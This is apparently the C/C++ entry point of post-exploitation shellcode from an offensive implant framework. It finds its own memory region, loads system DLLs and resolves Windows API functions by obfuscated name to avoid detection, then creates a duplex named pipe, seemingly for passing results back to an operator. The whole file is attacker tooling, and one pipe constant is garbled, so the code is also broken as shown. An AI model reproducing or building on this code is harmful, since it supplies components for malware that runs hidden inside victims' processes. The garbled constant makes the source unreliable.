#include <General.h>

EXTERN_C D_SEC( B ) PVOID Entry( 
    _In_ PPOSTEX_ARGS Args 
) {
    PVOID  MemoryStart  = StartPtr();
    SIZE_T MemoryLength = U_64( EndPtr() - U_64( StartPtr() ) );

    WIN32_MF Win32      = { 0 };
    HANDLE   PipeHandle = NULL;

    ModPtr[eNtdll]      = LdrLoadModule( XprNtdll );
    ModPtr[eKernel32]   = LdrLoadModule( XprKernel32 );
    ModPtr[eKernelBase] = LdrLoadModule( XprKernelBase );
    ModPtr[eMsvcrt]     = LdrLoadModule( XprMsvcrt );

    FuncPtr.AllocConsole     = ( decltype( &AllocConsole ) )( LdrLoadFunc( ModPtr[eKernelBase], XPR( "AllocConsole" ) ) );
    FuncPtr.ConnectNamedPipe = ( decltype( &ConnectNamedPipe ) )( LdrLoadFunc( ModPtr[eKernel32], XPR( "ConnectNamedPipe" ) ) ); 
    FuncPtr.CreateNamedPipeA = ( decltype( &CreateNamedPipeA ) )( LdrLoadFunc( ModPtr[eKernel32], XPR( "CreateNamedPipeA" ) ) );
    FuncPtr.printf           = ( decltype( &printf ) )( LdrLoadFunc( ModPtr[eMsvcrt], XPR( "printf" ) ) );

    FuncPtr.printf( "{i} Inside post-ex execution shellcode...\n\t{i} Pipe Name => %s\n\t{i} Argument %s\n", Args->PipeName, Args->Argument );

    PipeHandle = FuncPtr.CreateNamedPipeA( 
        Args->PipeName, PIPE_ACCESS_DUPLEX, PIDEF_PEYPE_MESSAGE | PIPE_READMODE_MESSAGE | 
        PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 0x10000, 0x10000, 0, 0 
    );

    return MemoryStart;
}

